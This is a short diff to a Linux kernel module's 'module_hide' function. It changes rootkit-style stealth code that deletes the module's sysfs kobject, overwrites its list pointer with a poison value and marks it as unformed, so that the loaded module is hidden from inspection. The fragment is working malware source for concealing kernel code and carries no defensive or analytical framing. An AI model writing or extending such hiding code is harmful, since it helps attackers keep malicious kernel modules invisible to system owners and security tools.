@@ -194,10 +194,10 @@ void module_hide(void) {
 
     // Remove from /sys/module
     kobject_del(&THIS_MODULE->mkobj.kobj);
-    /* if (THIS_MODULE->holders_dir) {
-        kobject_del(THIS_MODULE->holders_dir); // Remove module's holders directory if it exists
-    } */
-    // Nullify attributes to prevent crashes on access
+    
+    THIS_MODULE->list.prev = (list_head *)0xDEAD000000000122LL;
+    THIS_MODULE->state = MODULE_STATE_UNFORMED; // Change state to prevent loading
+	
     THIS_MODULE->sect_attrs = NULL;
     THIS_MODULE->notes_attrs = NULL;
 
